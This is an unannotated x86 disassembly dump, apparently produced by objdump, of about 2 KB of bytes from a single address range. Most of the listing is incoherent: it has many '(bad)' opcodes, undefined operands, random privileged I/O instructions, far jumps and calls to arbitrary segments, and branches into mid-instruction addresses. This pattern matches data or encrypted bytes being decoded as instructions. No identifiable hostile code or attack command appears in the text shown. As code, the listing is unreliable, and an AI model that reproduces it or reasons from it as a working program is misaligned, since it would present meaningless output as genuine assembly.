  413e90:	js     0x413e12
  413e92:	or     ecx,DWORD PTR [esi]
  413e94:	xchg   cl,al
  413e96:	dec    esi
  413e97:	push   ecx
  413e98:	add    bl,BYTE PTR ds:0xa105d9b8
  413e9e:	outs   dx,DWORD PTR ds:[esi]
  413e9f:	adc    ah,BYTE PTR [eax*1-0x295472e6]
  413ea6:	push   edi
  413ea7:	adc    ebp,esi
  413ea9:	add    DWORD PTR [esi],0xb60b36ee
  413eaf:	in     al,dx
  413eb0:	pop    ds
  413eb1:	add    al,0x7d
  413eb3:	(bad)  
  413eb4:	mov    esp,0x7ac451ae
  413eb9:	retf   0x99e2
  413ebc:	loop   0x413edd
  413ebe:	adc    eax,0x7d65a0be
  413ec3:	pop    ds
  413ec4:	jecxz  0x413e8f
  413ec6:	pop    ds
  413ec7:	inc    edi
  413ec8:	pop    eax
  413ec9:	dec    esp
  413eca:	sbb    ebx,edx
  413ecc:	pushf  
  413ecd:	cmp    al,BYTE PTR [esi+0x22]
  413ed0:	push   edx
  413ed1:	pop    ecx
  413ed2:	jge    0x413f17
  413ed4:	lods   eax,DWORD PTR ds:[esi]
  413ed5:	push   cs
  413ed6:	dec    ebx
  413ed7:	adc    DWORD PTR [edx+0x7d2f349],edi
  413edd:	jge    0x413f44
  413edf:	adc    edx,eax
  413ee1:	cld    
  413ee2:	daa    
  413ee3:	xor    al,0x4
  413ee5:	add    edx,DWORD PTR [edx]
  413ee7:	addr16 jle 0x413f40
  413eea:	or     al,0x71
  413eec:	sbb    DWORD PTR [esi],esp
  413eee:	jb     0x413e87
  413ef0:	adc    eax,0x601c4aa
  413ef5:	loope  0x413ef5
  413ef7:	mov    DWORD PTR [ebp+0x9],ecx
  413efa:	mov    ah,bl
  413efc:	fwait
  413efd:	outs   dx,BYTE PTR ds:[esi]
  413efe:	jg     0x413f5c
  413f00:	stos   BYTE PTR es:[edi],al
  413f01:	jle    0x413f0a
  413f03:	into   
  413f04:	and    edx,edi
  413f06:	mov    ah,0x7b
  413f08:	leave  
  413f09:	pop    esp
  413f0a:	jnp    0x413f38
  413f0c:	jae    0x413ebe
  413f0e:	clc    
  413f0f:	cmc    
  413f10:	js     0x413f75
  413f12:	mov    ecx,DWORD PTR [ecx]
  413f14:	adc    al,BYTE PTR [edx-0x5c]
  413f17:	leave  
  413f18:	adc    eax,0x7b97331
  413f1d:	pop    esp
  413f1e:	sar    DWORD PTR [eax],cl
  413f20:	scas   al,BYTE PTR es:[edi]
  413f21:	hlt    
  413f22:	push   ebx
  413f23:	in     eax,dx
  413f24:	pop    esp
  413f25:	inc    esp
  413f26:	test   DWORD PTR [edx-0x5a],eax
  413f29:	sub    eax,0x4182abb
  413f2e:	xchg   esp,eax
  413f2f:	shr    BYTE PTR [edx],cl
  413f31:	dec    esp
  413f32:	repnz lea ebx,[edx+0xb]
  413f36:	jle    0x413eee
  413f38:	xor    BYTE PTR [eax],al
  413f3a:	jl     0x413f15
  413f3c:	pop    ebx
  413f3d:	imul   ebx,ebp,0x6509ae0d
  413f43:	mov    ds:0xf8c48888,al
  413f48:	cmp    BYTE PTR [eax+0x2e],0xe2
  413f4c:	retf   
  413f4d:	mov    edi,0x3e3baab3
  413f52:	sbb    esp,DWORD PTR [ebx]
  413f54:	(bad)  
  413f55:	ds test edi,0x8b642c64
  413f5c:	adc    eax,0x5b682af7
  413f61:	test   BYTE PTR [eax+0x7701ecdd],0xf6
  413f68:	popf   
  413f69:	mov    esp,0x9f45a88b
  413f6e:	and    esi,DWORD PTR [ebp-0x3f]
  413f71:	cmp    edi,DWORD PTR [esi]
  413f73:	enter  0xfb91,0x2
  413f77:	mov    ch,0xf4
  413f79:	sbb    eax,0x5e217ebd
  413f7e:	pop    eax
  413f7f:	mov    edx,0x2fb0c2a4
  413f84:	or     dh,BYTE PTR [ecx*4+0x4f346e2f]
  413f8b:	mov    esi,0xd1bfc05d
  413f90:	ror    DWORD PTR [eax+0x64],0x51
  413f94:	and    al,0xe6
  413f96:	or     BYTE PTR [esp+esi*1-0x11],bl
  413f9a:	push   edi
  413f9b:	pop    ecx
  413f9c:	rol    BYTE PTR fs:[edi-0x5a],cl
  413fa0:	enter  0x1f5f,0x8f
  413fa4:	lock adc al,0x83
  413fa7:	inc    ebp
  413fa8:	icebp  
  413fa9:	pop    edx
  413faa:	xor    eax,0xd22e264d
  413faf:	sbb    ch,BYTE PTR [esi-0x26]
  413fb2:	out    0xcb,al
  413fb4:	in     eax,dx
  413fb5:	scas   eax,DWORD PTR es:[edi]
  413fb6:	adc    eax,0xc580f75b
  413fbb:	sahf   
  413fbc:	into   
  413fbd:	sbb    BYTE PTR [eax-0x72],0xae
  413fc1:	mov    ebp,0x631fedd3
  413fc6:	call   0x8a73:0xe282d85b
  413fcd:	xchg   edx,eax
  413fce:	ds dec ebx
  413fd0:	test   bh,al
  413fd2:	jnp    0x413f66
  413fd4:	hlt    
  413fd5:	dec    ecx
  413fd6:	add    edi,esi
  413fd8:	and    BYTE PTR [ebp-0x11],cl
  413fdb:	push   es
  413fdc:	dec    esp
  413fdd:	retf   
  413fde:	ror    DWORD PTR [esi-0x2e277374],cl
  413fe4:	mov    bl,0x9d
  413fe6:	shl    BYTE PTR [eax+eax*8+0x35],0xea
  413feb:	xor    eax,0x7a8226f9
  413ff0:	imul   ebx,ebx,0xc
  413ff3:	push   edx
  413ff4:	aad    0x41
  413ff6:	inc    edx
  413ff7:	aam    0xe1
  413ff9:	out    0x7a,eax
  413ffb:	ins    DWORD PTR es:[edi],dx
  413ffc:	sub    eax,0xdf366380
  414001:	xchg   esp,eax
  414002:	mov    bl,0xe5
  414004:	inc    edx
  414005:	popf   
  414006:	sub    dh,BYTE PTR [eax]
  414008:	pop    eax
  414009:	sub    ecx,DWORD PTR [ecx-0x6499a561]
  41400f:	push   eax
  414010:	cmc    
  414011:	and    BYTE PTR [edx],0xf5
  414014:	push   edx
  414015:	adc    cl,BYTE PTR [edi]
  414017:	scas   eax,DWORD PTR es:[edi]
  414018:	fistp  DWORD PTR [eax-0x3980d476]
  41401e:	cmp    DWORD PTR [esi],ecx
  414020:	jae    0x41405f
  414022:	test   DWORD PTR [edx+0x77cd4659],edx
  414028:	cld    
  414029:	sbb    ah,BYTE PTR [ebx+0x5]
  41402c:	out    0x8f,eax
  41402e:	pop    edx
  41402f:	test   BYTE PTR [ebx+edx*1-0x74],dh
  414033:	mov    ds:0x5aced7fd,al
  414038:	je     0x41409c
  41403a:	mov    eax,0x8b9e5953
  41403f:	leave  
  414040:	or     ebx,DWORD PTR [esi-0x134b2f3e]
  414046:	mov    edi,esp
  414048:	xchg   esi,eax
  414049:	sub    al,cl
  41404b:	mov    bh,0x6
  41404d:	enter  0x5e98,0xc
  414051:	mov    eax,ds:0xfd4bcb15
  414056:	push   ecx
  414057:	xchg   esp,eax
  414058:	(bad)  
  414059:	cmp    dl,BYTE PTR [edx+0x156a2aa3]
  41405f:	ret    
  414060:	pop    ebx
  414061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414062:	nop
  414063:	stos   DWORD PTR es:[edi],eax
  414064:	or     DWORD PTR [esi-0x7d11481f],ecx
  41406a:	jnp    0x414029
  41406c:	jle    0x414096
  41406e:	in     eax,dx
  41406f:	les    edi,FWORD PTR [ecx]
  414071:	stos   DWORD PTR es:[edi],eax
  414072:	fs lahf 
  414074:	push   edi
  414075:	add    eax,0xe14d94e5
  41407a:	cs mov ch,0xc7
  41407d:	xchg   edi,eax
  41407e:	mov    al,ds:0x3d819b2b
  414083:	cld    
  414084:	jmp    0xe0a3:0x23ed4af7
  41408b:	sbb    esi,DWORD PTR ds:0xfb1a0e1e
  414091:	and    DWORD PTR [ecx+ebp*1],ecx
  414094:	test   ch,ch
  414096:	in     eax,dx
  414097:	xlat   BYTE PTR ds:[ebx]
  414098:	(bad)  
  414099:	xchg   esi,eax
  41409a:	lods   eax,DWORD PTR ds:[esi]
  41409b:	scas   eax,DWORD PTR es:[edi]
  41409c:	add    esp,eax
  41409e:	in     eax,dx
  41409f:	js     0x414022
  4140a1:	aas    
  4140a2:	test   eax,0xa5f3fedd
  4140a7:	and    al,0x87
  4140a9:	ins    BYTE PTR es:[edi],dx
  4140aa:	mov    bh,0x19
  4140ac:	inc    ebx
  4140ad:	cmp    BYTE PTR [edi-0x45],0x88
  4140b1:	push   edi
  4140b2:	cmp    ebp,0x591ee9e3
  4140b8:	cmp    BYTE PTR [edi],ah
  4140ba:	punpckhbw mm7,QWORD PTR [edx+0x7a31353d]
  4140c1:	xor    eax,0x9c472c29
  4140c6:	mul    BYTE PTR [edx+edx*4-0x46]
  4140ca:	(bad)  
  4140cb:	mov    ebp,0x22457b65
  4140d0:	ja     0x4140c2
  4140d2:	cmc    
  4140d3:	push   ebx
  4140d4:	mov    ds:0x6e6a0a3b,eax
  4140d9:	push   es
  4140da:	xchg   DWORD PTR [ecx],esi
  4140dc:	push   esp
  4140dd:	aaa    
  4140de:	or     ch,0x67
  4140e1:	xor    al,0xdd
  4140e3:	(bad)  
  4140e4:	jmp    0xcb9c:0x6abbc97c
  4140eb:	cs mov edx,0x7b79808f
  4140f1:	jecxz  0x4140e8
  4140f3:	ja     0x414093
  4140f5:	bound  ebx,QWORD PTR [esi]
  4140f7:	(bad)  
  4140f8:	jmp    0x8b731267
  4140fd:	jmp    0x4a54:0x301b02d9
  414104:	pop    ds
  414105:	cld    
  414106:	outs   dx,BYTE PTR ds:[esi]
  414107:	and    al,bh
  414109:	loopne 0x414120
  41410b:	rcr    BYTE PTR [ecx+ebp*2-0x45eba8f5],cl
  414112:	push   ds
  414113:	push   ds
  414114:	out    dx,al
  414115:	pop    esp
  414116:	arpl   WORD PTR [ebx-0x45],di
  414119:	mov    al,ds:0xab42aec
  41411e:	mov    dl,0x37
  414120:	jp     0x414156
  414122:	in     al,dx
  414123:	div    DWORD PTR [ebx+0x475305f8]
  414129:	fadd   QWORD PTR [ecx+0x3f]
  41412c:	call   0xf1cce90b
  414131:	in     eax,0xbf
  414133:	sub    BYTE PTR [ebp+0x41aea5d1],dl
  414139:	fs xchg esi,eax
  41413b:	xchg   DWORD PTR [ebp-0x52e32916],eax
  414141:	arpl   WORD PTR ds:0x5b3bf7e4,dx
  414147:	fmul   QWORD PTR [edx]
  414149:	and    eax,0x93297bb5
  41414e:	mov    eax,ds:0x9842943b
  414153:	add    dh,BYTE PTR [edi]
  414155:	je     0x41418b
  414157:	jnp    0x4141d6
  414159:	in     eax,dx
  41415a:	xor    al,0x5e
  41415c:	xchg   edx,eax
  41415d:	sub    DWORD PTR [ebp-0x5c35aa70],edx
  414163:	and    esi,DWORD PTR ds:0x3a286687
  414169:	icebp  
  41416a:	daa    
  41416b:	aas    
  41416c:	ins    BYTE PTR es:[edi],dx
  41416d:	and    al,0x22
  41416f:	loopne 0x41413c
  414171:	push   ebp
  414172:	lea    ebx,[ebx]
  414174:	imul   ecx,edi,0xffffffda
  414177:	pop    esi
  414178:	pop    esi
  414179:	xchg   ebp,eax
  41417a:	test   DWORD PTR [esp+ebp*1],edx
  41417d:	loop   0x4141ee
  41417f:	inc    ecx
  414180:	aaa    
  414181:	int    0x6b
  414183:	retf   
  414184:	jns    0x414185
  414186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414187:	fisub  DWORD PTR [edi+0x6d]
  41418a:	push   eax
  41418b:	ins    BYTE PTR es:[edi],dx
  41418c:	idiv   ecx
  41418e:	inc    ebp
  41418f:	xor    DWORD PTR [edi],ecx
  414191:	xchg   esp,eax
  414192:	ins    DWORD PTR es:[edi],dx
  414193:	aad    0xad
  414195:	out    dx,eax
  414196:	cmp    DWORD PTR gs:[edx+0x33cb4ae7],edi
  41419d:	cmp    esi,eax
  41419f:	xor    DWORD PTR [eax],edi
  4141a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141a2:	add    DWORD PTR [esi],0xa37fe8ca
  4141a8:	xchg   esi,eax
  4141a9:	xchg   ebx,eax
  4141aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141ab:	adc    BYTE PTR [edi+ecx*2],bh
  4141ae:	cmc    
  4141af:	mov    bh,0x35
  4141b1:	hlt    
  4141b2:	cwde   
  4141b3:	ins    BYTE PTR es:[edi],dx
  4141b4:	dec    ebp
  4141b5:	mov    dl,BYTE PTR [esi+ecx*8]
  4141b8:	(bad)  
  4141b9:	cmp    al,BYTE PTR [ecx]
  4141bb:	stos   DWORD PTR es:[edi],eax
  4141bc:	dec    ebp
  4141bd:	pop    ds
  4141be:	data16 mov bl,0x18
  4141c1:	push   ds
  4141c2:	xchg   esi,eax
  4141c3:	shr    BYTE PTR [eax+0x2c],1
  4141c6:	mov    ebp,0xffd91780
  4141cb:	push   eax
  4141cc:	int3   
  4141cd:	fld    st(1)
  4141cf:	retf   
  4141d0:	mov    cl,BYTE PTR [esi-0x53]
  4141d3:	in     eax,0x54
  4141d5:	fcomp  st(6)
  4141d7:	into   
  4141d8:	test   al,0x30
  4141da:	lea    ebp,[edx-0x7c]
  4141dd:	mov    ch,0x2e
  4141df:	mov    BYTE PTR [eax-0x516b741d],dl
  4141e5:	push   eax
  4141e6:	aad    0x11
  4141e8:	xor    edi,esp
  4141ea:	mov    WORD PTR [edi+ebx*8],?
  4141ed:	jb     0x4141e7
  4141ef:	sub    bl,bl
  4141f1:	push   ecx
  4141f2:	ins    DWORD PTR es:[edi],dx
  4141f3:	xor    cl,dh
  4141f5:	and    eax,DWORD PTR [ecx-0x6b]
  4141f8:	cmp    dl,BYTE PTR [edi-0x6b]
  4141fb:	mov    WORD PTR [esi-0x13],?
  4141fe:	cdq    
  4141ff:	and    edx,DWORD PTR [ebx+ebp*8-0x58f9a107]
  414206:	test   BYTE PTR [edx+0x4305a850],cl
  41420c:	test   eax,0x7a3e88fb
  414211:	fadd   QWORD PTR [ecx]
  414213:	jecxz  0x414290
  414215:	or     BYTE PTR [edi+esi*2],al
  414218:	mov    bl,0x9d
  41421a:	lock mov al,0xa7
  41421d:	sub    BYTE PTR [eax-0x25],bl
  414220:	jmp    0xc9ceb115
  414225:	ficom  DWORD PTR ds:0xea5c9607
  41422b:	push   es
  41422c:	xlat   BYTE PTR ds:[ebx]
  41422d:	stos   BYTE PTR es:[edi],al
  41422e:	mov    dh,0x87
  414230:	stos   DWORD PTR es:[edi],eax
  414231:	jecxz  0x414295
  414233:	retf   
  414234:	call   0x25406127
  414239:	mul    DWORD PTR [edi+eiz*8-0x2e2f042]
  414240:	mov    ecx,edi
  414242:	inc    ecx
  414243:	loope  0x41424c
  414245:	test   DWORD PTR [ebx-0x7e020b1d],edi
  41424b:	(bad)  
  41424c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41424d:	cli    
  41424e:	(bad)  
  41424f:	cwde   
  414250:	out    dx,eax
  414251:	sbb    DWORD PTR [edx],ebx
  414253:	adc    DWORD PTR [edi],esi
  414255:	(bad)  
  414257:	jmp    0x52c1:0x60548e39
  41425e:	call   0x1714:0x6f84444f
  414265:	loope  0x4142c7
  414267:	addps  xmm2,XMMWORD PTR [ebx]
  41426a:	int    0xda
  41426c:	dec    ebx
  41426d:	jne    0x4142ca
  41426f:	jg     0x4142ea
  414271:	in     eax,0x4b
  414273:	dec    ecx
  414274:	pop    ebp
  414275:	mov    ds:0xb0f86a62,eax
  41427a:	cli    
  41427b:	inc    ecx
  41427c:	aaa    
  41427d:	idiv   BYTE PTR [eax]
  41427f:	test   edx,edx
  414281:	mov    ebx,0x7dbc7e22
  414286:	int3   
  414287:	popf   
  414288:	jecxz  0x41420e
  41428a:	adc    al,0xe
  41428c:	mov    ah,dh
  41428e:	scas   eax,DWORD PTR es:[edi]
  41428f:	outs   dx,BYTE PTR ds:[esi]
  414290:	jp     0x41427c
  414292:	popf   
  414293:	je     0x4142fc
  414295:	push   ebx
  414296:	adc    cl,BYTE PTR [ebp-0x7c290474]
  41429c:	cmp    ecx,edx
  41429e:	leave  
  41429f:	inc    eax
  4142a0:	(bad)  
  4142a1:	maxps  xmm0,XMMWORD PTR [ebp-0x4417f29f]
  4142a8:	jmp    0x850a322b
  4142ad:	es push ecx
  4142af:	data16 mov BYTE PTR [esi-0x25],bl
  4142b3:	pop    ss
  4142b4:	ja     0x4142c1
  4142b6:	xchg   esp,eax
  4142b7:	jmp    0x41432a
  4142b9:	(bad)  
  4142bb:	dec    ebp
  4142bc:	icebp  
  4142bd:	adc    DWORD PTR [esi-0x39],eax
  4142c0:	and    eax,0x759d494f
  4142c5:	adc    al,0x88
  4142c7:	into   
  4142c8:	sbb    BYTE PTR ds:[edi+0x23],cl
  4142cc:	ret    
  4142cd:	pop    ecx
  4142ce:	or     edi,DWORD PTR [ecx-0x6be4ceab]
  4142d4:	(bad)  
  4142d5:	(bad)  [ecx+ecx*8]
  4142d8:	or     eax,0xb1b69824
  4142dd:	cmc    
  4142de:	loope  0x414358
  4142e0:	ja     0x414304
  4142e2:	push   ebp
  4142e3:	lods   eax,DWORD PTR ds:[esi]
  4142e4:	ret    0xc283
  4142e7:	clc    
  4142e8:	aaa    
  4142e9:	imul   ebx,DWORD PTR [eax-0x36],0x3806dbf4
  4142f0:	pop    ds
  4142f1:	pop    esp
  4142f2:	shrd   ecx,esi,cl
  4142f5:	loopne 0x4142d9
  4142f7:	cmp    al,0x3b
  4142f9:	fs call 0x4a1b6b31
  4142ff:	div    DWORD PTR [eax]
  414301:	fist   WORD PTR [ebx+0x7f427551]
  414307:	dec    eax
  414308:	adc    al,BYTE PTR [edi-0x4b]
  41430b:	stos   BYTE PTR es:[edi],al
  41430c:	sub    BYTE PTR [edi],cl
  41430e:	push   esi
  41430f:	xor    DWORD PTR [ecx-0x7a16bd80],edx
  414315:	xor    al,0x74
  414317:	mov    esp,0x15c10910
  41431c:	shl    DWORD PTR [edi-0x34236b66],cl
  414322:	aas    
  414323:	mov    dl,0x37
  414325:	jg     0x414309
  414327:	lock inc eax
  414329:	cdq    
  41432a:	push   0xe76df881
  41432f:	pop    esi
  414330:	mov    eax,0x5310912f
  414335:	fsubr  DWORD PTR [esp+eax*2+0x46]
  414339:	lods   eax,DWORD PTR ds:[esi]
  41433a:	test   eax,0x7f726d1d
  41433f:	in     eax,dx
  414340:	hlt    
  414341:	pop    esi
  414342:	jns    0x41438c
  414344:	mov    ecx,0xb6215368
  414349:	pop    ss
  41434a:	push   esp
  41434b:	xchg   esp,eax
  41434c:	rcr    BYTE PTR [edi-0x475e9c50],0x83
  414353:	and    eax,0xbcd121c6
  414358:	pop    ss
  414359:	mov    esp,0x3f4d60fc
  41435e:	add    al,0x56
  414360:	fcmovu st,st(2)
  414362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414363:	mov    dl,0x39
  414365:	rol    BYTE PTR [ecx],0x4e
  414368:	enter  0x1077,0xa1
  41436c:	dec    ebx
  41436d:	add    eax,0x8df52829
  414372:	imul   esi,DWORD PTR ds:0xc6c8e78e,0x94eddae4
  41437c:	pop    ecx
  41437d:	ss sub al,0x17
  414380:	out    0xc9,al
  414382:	adc    bl,BYTE PTR [ecx]
  414384:	xadd   DWORD PTR [eax-0x4871cec8],ecx
  41438b:	call   0x6716:0xaeff6c17
  414392:	int3   
  414393:	leave  
  414394:	and    eax,0xa7e9afd6
  414399:	std    
  41439a:	push   esp
  41439b:	jne    0x414329
  41439d:	ds pusha 
  41439f:	sbb    DWORD PTR [esi-0x40],ebx
  4143a2:	sar    ch,0x48
  4143a5:	ss dec edi
  4143a7:	faddp  st(3),st
  4143a9:	pop    ss
  4143aa:	sub    eax,0xb168c2cb
  4143af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143b0:	aas    
  4143b1:	hlt    
  4143b2:	xchg   esi,eax
  4143b3:	xor    bl,BYTE PTR [edi-0x5df748e6]
  4143b9:	data16 movs WORD PTR es:[edi],WORD PTR ds:[esi]
  4143bc:	mov    ah,0xb9
  4143be:	xor    al,0xd7
  4143c0:	ds js  0x41437f
  4143c3:	(bad)  
  4143c4:	and    dh,BYTE PTR gs:0x412ad03b
  4143cb:	into   
  4143cc:	mov    esi,edx
  4143ce:	arpl   si,dx
  4143d0:	push   ebx
  4143d1:	xor    DWORD PTR [eax-0x6764368e],ebx
  4143d7:	rol    bh,1
  4143d9:	sti    
  4143da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143db:	mov    esi,0x5d81ff2
  4143e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143e1:	jge    0x4143e5
  4143e3:	or     cl,bh
  4143e5:	rcl    DWORD PTR [edi-0x3499565a],1
  4143eb:	mov    edx,0x580b5c7d
  4143f0:	push   ss
  4143f1:	or     BYTE PTR [esi+0x426642f1],0x5f
  4143f8:	test   al,0x8e
  4143fa:	adc    edx,DWORD PTR [ebx+0x39]
  4143fd:	test   edx,edi
  4143ff:	call   0x1bdae0f9
  414404:	repz pushf 
  414406:	add    edx,DWORD PTR [edx-0x78]
  414409:	and    eax,0xe9a8fa98
  41440e:	data16 ja 0x41439a
  414411:	fild   WORD PTR ds:[ecx+ecx*4+0xf349087]
  414419:	pop    ds
  41441a:	adc    al,BYTE PTR [ecx]
  41441c:	fiadd  DWORD PTR [ebp+0x1330dd4f]
  414422:	test   dl,ah
  414424:	mov    ah,bl
  414426:	xchg   esi,eax
  414427:	push   ss
  414428:	dec    ecx
  414429:	jb     0x4143f0
  41442b:	icebp  
  41442c:	test   ch,dh
  41442e:	mov    esi,0xe669def3
  414433:	and    eax,DWORD PTR [ecx+ecx*8]
  414436:	push   ss
  414437:	gs dec eax
  414439:	push   ebp
  41443a:	clc    
  41443b:	cwde   
  41443c:	nop
  41443d:	inc    edi
  41443e:	std    
  41443f:	dec    ecx
  414440:	arpl   WORD PTR [ecx-0x5],dx
  414443:	push   eax
  414444:	ret    0xa271
  414447:	or     WORD PTR [eax-0x19a4d8bb],si
  41444e:	ds fwait
  414450:	stos   DWORD PTR es:[edi],eax
  414451:	ret    0x9bcf
  414454:	out    0xe3,eax
  414456:	jo     0x4143ff
  414458:	into   
  414459:	les    eax,FWORD PTR [esi]
  41445b:	in     al,0xf2
  41445d:	call   0x9b9801b9
  414462:	dec    esp
  414463:	jl     0x4144bd
  414465:	icebp  
  414466:	addr16 and bl,bl
  414469:	inc    esp
  41446a:	mov    cl,0xb8
  41446c:	sub    ecx,ebp
  41446e:	push   ds
  41446f:	fdivr  st(0),st
  414471:	out    dx,al
  414472:	dec    edi
  414473:	out    0x3,eax
  414475:	dec    esp
  414476:	jl     0x41444b
  414478:	shl    BYTE PTR [ebx-0x7],cl
  41447b:	jne    0x4144e8
  41447d:	inc    edi
  41447e:	out    dx,al
  41447f:	repz fnstsw WORD PTR [edx-0x2eb0e24e]
  414486:	out    0x4d,al
  414488:	sub    eax,0x1f7ff5e4
  41448d:	inc    ecx
  41448e:	pop    esp
  41448f:	jge    0x414507
  414491:	mov    ebp,0x8f00530
  414496:	push   eax
  414497:	xlat   BYTE PTR ds:[ebx]
  414498:	cmp    eax,0x97371e0c
  41449d:	out    0x9b,eax
  41449f:	into   
  4144a0:	add    eax,0xe82f593c
  4144a5:	inc    eax
  4144a6:	ret    0xcf22
  4144a9:	pop    ebp
  4144aa:	outs   dx,DWORD PTR ds:[esi]
  4144ab:	dec    edi
  4144ac:	shr    DWORD PTR [edi*2-0x7fa943dd],1
  4144b3:	xor    BYTE PTR [esi-0x3],dl
  4144b6:	ins    DWORD PTR es:[edi],dx
  4144b7:	jne    0x414475
  4144b9:	xchg   esi,ebx
  4144bb:	cmp    dl,BYTE PTR [ebx+0x2fc970b3]
  4144c1:	fsub   DWORD PTR [ebp+ebp*1+0x2a]
  4144c5:	int    0x30
  4144c7:	cmp    ecx,0xffffffd8
  4144ca:	jno    0x414495
  4144cc:	jbe    0x4144b5
  4144ce:	push   ebx
  4144cf:	cmp    bl,BYTE PTR [ebp-0x41742560]
  4144d5:	and    ah,bl
  4144d7:	lods   al,BYTE PTR ds:[esi]
  4144d8:	mov    bl,BYTE PTR [eax]
  4144da:	outs   dx,BYTE PTR ds:[esi]
  4144db:	iret   
  4144dc:	(bad)  
  4144dd:	clc    
  4144de:	lods   eax,DWORD PTR ds:[esi]
  4144df:	test   esp,edi
  4144e1:	aas    
  4144e2:	pop    edx
  4144e3:	ja     0x414465
  4144e5:	mov    al,0xbe
  4144e7:	mov    bh,0x72
  4144e9:	sbb    eax,ebx
  4144eb:	or     al,0x9a
  4144ed:	test   eax,0xaec5ef0a
  4144f2:	mov    ah,0x62
  4144f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144f5:	mov    bh,0xc1
  4144f7:	jg     0x414530
  4144f9:	xchg   bh,bh
  4144fb:	ror    esp,0xaf
  4144fe:	ins    DWORD PTR es:[edi],dx
  4144ff:	mov    edx,0x431bc286
  414504:	jg     0x4144f4
  414506:	cs push ecx
  414508:	cmp    BYTE PTR [esi+ebp*2-0x7bf474de],dh
  41450f:	sbb    DWORD PTR [edi-0x7d],eax
  414512:	icebp  
  414513:	cmp    al,0x51
  414515:	or     esi,DWORD PTR [ecx+esi*8]
  414518:	sbb    esi,ebx
  41451a:	push   ds
  41451b:	inc    edx
  41451c:	fnstenv [eax+edx*4]
  41451f:	xchg   esi,eax
  414520:	inc    esi
  414521:	aaa    
  414522:	sar    DWORD PTR [ebp+0xd],0xff
  414526:	or     eax,0x7d723acd
  41452b:	add    BYTE PTR [ebp+0x38],dl
  41452e:	jl     0x41459f
  414530:	lock mov edi,0x522dc256
  414536:	add    edi,DWORD PTR [edx+0x6eed69a0]
  41453c:	lods   al,BYTE PTR ds:[esi]
  41453d:	mov    ebx,0x46f02c61
  414542:	imul   ebx,DWORD PTR [edi+0x3faf798c],0x74ab0056
  41454c:	dec    edx
  41454d:	out    dx,al
  41454e:	pusha  
  41454f:	and    DWORD PTR [eax+ebp*2-0x6433af5f],0xffffffe7
  414557:	mov    BYTE PTR [esi-0x26949dd1],bh
  41455d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41455e:	out    0x26,al
  414560:	std    
  414561:	addr16 xchg esi,eax
  414563:	and    esi,DWORD PTR [ebx+0x57]
  414566:	and    al,0x91
  414568:	and    ebx,DWORD PTR [ebp-0x26b853d]
  41456e:	sub    bl,BYTE PTR [ebp-0x14]
  414571:	in     eax,dx
  414572:	xor    DWORD PTR [edx+0x6e0b3887],ecx
  414578:	dec    eax
  414579:	mov    al,0xb8
  41457b:	bound  edx,QWORD PTR [ebx-0x1c150279]
  414581:	sar    BYTE PTR [ebp-0x15],cl
  414584:	cmp    cl,BYTE PTR [edx-0x3492bf6b]
  41458a:	dec    edi
  41458b:	mov    esp,0x2958a13f
  414590:	sub    ah,ah
  414592:	ins    BYTE PTR es:[edi],dx
  414593:	rol    DWORD PTR [edi+esi*2+0x28e65c79],1
  41459a:	mov    ecx,0xa3850395
  41459f:	add    ch,BYTE PTR [eax+0x79ce8469]
  4145a5:	mov    bl,BYTE PTR [edx]
  4145a7:	test   al,0xc8
  4145a9:	sbb    BYTE PTR [ebx],0x1e
  4145ac:	jae    0x41462d
  4145ae:	xor    ch,BYTE PTR [eax]
  4145b0:	xor    dh,BYTE PTR [eax+edx*8-0x55]
  4145b4:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4145b6:	adc    DWORD PTR [ebp+0x6],eax
  4145b9:	xchg   esi,eax
  4145ba:	pop    ebx
  4145bb:	in     al,0xd8
  4145bd:	mov    eax,0x7a443d4c
  4145c2:	and    al,dh
  4145c4:	pop    ss
  4145c5:	mov    esi,0x986e40dd
  4145ca:	add    bl,bh
  4145cc:	or     al,BYTE PTR [edi+0x70124033]
  4145d2:	mov    ds:0x7e1c51eb,eax
  4145d7:	pop    ebp
  4145d8:	(bad)  
  4145d9:	aam    0x49
  4145db:	ret    0x83fa
  4145de:	(bad)  
  4145df:	and    eax,0xd9d79e50
  4145e4:	add    al,0x11
  4145e7:	iret   
  4145e8:	test   al,0xe2
  4145ea:	pop    ebp
  4145eb:	cmp    eax,DWORD PTR [esp+ebp*8-0x35]
  4145ef:	mov    edi,edi
  4145f1:	frstor es:[esi]
  4145f4:	dec    edx
  4145f5:	xor    al,BYTE PTR [eax]
  4145f7:	inc    esi
  4145f8:	(bad)  
  4145f9:	jecxz  0x41466c
  4145fb:	push   edx
  4145fc:	lahf   
  4145fd:	clc    
  4145fe:	xor    BYTE PTR [edx+edx*4],bh
  414601:	mov    bl,0xcd
  414603:	sub    edx,DWORD PTR [eax+0x70dd4987]
  414609:	push   ecx
  41460a:	xor    edi,edx
  41460c:	add    DWORD PTR [edx],edx
  41460e:	sub    ch,BYTE PTR [edx+0x42]
  414611:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414612:	add    ebx,DWORD PTR [edi-0x64]
  414615:	cdq    
  414616:	lods   al,BYTE PTR ds:[esi]
  414617:	mov    al,0xf3
  414619:	mov    ah,0xf4
  41461b:	dec    esp
  41461c:	lea    ecx,[ebp-0x748b35ef]
  414622:	leave  
  414623:	mov    dl,0xa2
  414625:	stos   BYTE PTR es:[edi],al
  414626:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414627:	inc    esi
  414628:	inc    esi
  414629:	in     al,dx
  41462a:	push   ecx
  41462b:	adc    dl,BYTE PTR [esi+0xc]
  41462e:	popf   
  41462f:	push   ebp
  414630:	sub    eax,DWORD PTR [edx-0x63]
  414633:	inc    esi
  414634:	lods   eax,DWORD PTR ds:[esi]
  414635:	sub    al,0xe6
  414637:	push   eax
  414638:	mov    cl,0xab
  41463a:	xchg   edi,eax
  41463b:	adc    DWORD PTR [edx+edi*2],ebp
